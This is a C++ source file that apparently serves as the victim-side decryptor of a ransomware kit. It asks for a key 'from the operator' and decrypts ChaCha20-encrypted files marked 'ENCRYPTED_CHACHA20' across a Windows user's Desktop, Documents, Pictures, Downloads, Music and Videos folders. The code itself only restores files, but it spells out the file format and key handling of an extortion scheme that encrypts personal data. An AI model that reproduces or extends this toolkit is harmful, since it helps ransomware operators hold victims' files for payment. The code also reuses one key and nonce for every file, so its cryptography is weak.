#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <windows.h>
#include <shlobj.h>
#include <sodium.h>
#pragma comment(lib, "shell32.lib")

namespace fs = std::filesystem;

// Magic string to mark encrypted files
const std::string MAGIC_STRING = "ENCRYPTED_CHACHA20"; // 18 bytes

// Convert hex string back to bytes
std::vector<unsigned char> hex_to_bytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        unsigned char byte = (unsigned char)strtol(byteString.c_str(), nullptr, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

bool is_file_encrypted(const fs::path& filePath, unsigned char* nonce, size_t nonce_len) {
    std::ifstream inputFile(filePath, std::ios::binary);
    if (!inputFile) return false;

    std::string header(MAGIC_STRING.length(), '\0');
    inputFile.read(&header[0], MAGIC_STRING.length());
    if (header != MAGIC_STRING) {
        inputFile.close();
        return false;
    }

    inputFile.seekg(0, std::ios::end);
    std::streampos fileSize = inputFile.tellg();
    if (fileSize < static_cast<std::streamoff>(MAGIC_STRING.length() + nonce_len)) {
        inputFile.close();
        return false;
    }

    inputFile.seekg(fileSize - static_cast<std::streamoff>(nonce_len));
    inputFile.read(reinterpret_cast<char*>(nonce), nonce_len);
    inputFile.close();
    return true;
}

void chacha20DecryptFile(const fs::path& filePath, const unsigned char* key, const unsigned char* nonce) {
    unsigned char file_nonce[crypto_stream_chacha20_NONCEBYTES];
    if (!is_file_encrypted(filePath, file_nonce, sizeof(file_nonce))) {
        std::cerr << "Skipping unencrypted or invalid file: " << filePath << std::endl;
        return;
    }

    if (memcmp(file_nonce, nonce, sizeof(file_nonce)) != 0) {
        std::cerr << "Nonce mismatch for file: " << filePath << ". Wrong decryption key." << std::endl;
        return;
    }

    std::ifstream inputFile(filePath, std::ios::binary);
    if (!inputFile) {
        std::cerr << "Failed to open: " << filePath << std::endl;
        return;
    }

    inputFile.seekg(0, std::ios::end);
    std::streampos fileSize = inputFile.tellg();
    size_t encrypted_size = static_cast<size_t>(fileSize - static_cast<std::streamoff>(MAGIC_STRING.length() + sizeof(file_nonce)));
    std::vector<unsigned char> buffer(encrypted_size);
    inputFile.seekg(MAGIC_STRING.length());
    inputFile.read(reinterpret_cast<char*>(buffer.data()), encrypted_size);
    inputFile.close();

    std::vector<unsigned char> decrypted(buffer.size());
    crypto_stream_chacha20_xor(decrypted.data(), buffer.data(), buffer.size(), nonce, key);

    std::ofstream outputFile(filePath, std::ios::binary);
    if (!outputFile) {
        std::cerr << "Failed to write: " << filePath << std::endl;
        return;
    }
    outputFile.write(reinterpret_cast<char*>(decrypted.data()), decrypted.size());
    outputFile.close();
}

void traverseAndDecrypt(const fs::path& dirPath, const unsigned char* key, const unsigned char* nonce) {
    for (const auto& entry : fs::recursive_directory_iterator(dirPath)) {
        if (fs::is_regular_file(entry)) {
            chacha20DecryptFile(entry.path(), key, nonce);
        }
    }
}

int main() {
    if (sodium_init() < 0) {
        std::cerr << "Libsodium initialization failed." << std::endl;
        return 1;
    }

    std::string decryption_key_hex;
    std::cout << "Enter the decryption key from the operator (80 hex characters): ";
    std::getline(std::cin, decryption_key_hex);

    if (decryption_key_hex.length() != (crypto_stream_chacha20_KEYBYTES + crypto_stream_chacha20_NONCEBYTES) * 2) {
        std::cerr << "Invalid decryption key length. It must be 80 hex characters (32-byte key + 8-byte nonce)." << std::endl;
        return 1;
    }

    std::vector<unsigned char> decryption_key_bytes = hex_to_bytes(decryption_key_hex);
    unsigned char* key = decryption_key_bytes.data();                  // First 32 bytes
    unsigned char* nonce = decryption_key_bytes.data() + crypto_stream_chacha20_KEYBYTES; // Last 8 bytes

    std::vector<std::wstring> commonFolders = {
        L"Desktop", L"Documents", L"Pictures", L"Downloads", L"Music", L"Videos"
    };
    wchar_t userProfile[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile) != S_OK) {
        std::cerr << "Failed to get user profile path. Error: " << GetLastError() << std::endl;
        return 1;
    }

    for (const auto& folder : commonFolders) {
        fs::path dirPath = fs::path(userProfile) / folder;
        if (fs::exists(dirPath) && fs::is_directory(dirPath)) {
            traverseAndDecrypt(dirPath, key, nonce);
        }
    }

    std::cout << "Files decrypted successfully." << std::endl;
    return 0;
}